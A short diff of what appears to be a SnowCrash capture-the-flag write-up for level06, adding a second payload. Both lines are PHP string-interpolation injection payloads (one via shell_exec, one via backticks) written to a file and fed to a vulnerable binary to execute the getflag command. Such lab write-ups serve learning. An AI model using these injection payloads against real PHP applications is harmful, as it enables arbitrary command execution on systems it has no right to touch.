@@ -44,6 +44,10 @@ level06@SnowCrash:~$ cat /tmp/level06.php
 
 echo -e '[x {${shell_exec(getflag)}}]' > /tmp/file && ./level06 /tmp/file
 
+or 
+
+echo -e "[x \${\`getflag\`}]" > /tmp/file && ./level06 /tmp/file
+
 and bingo
 
 
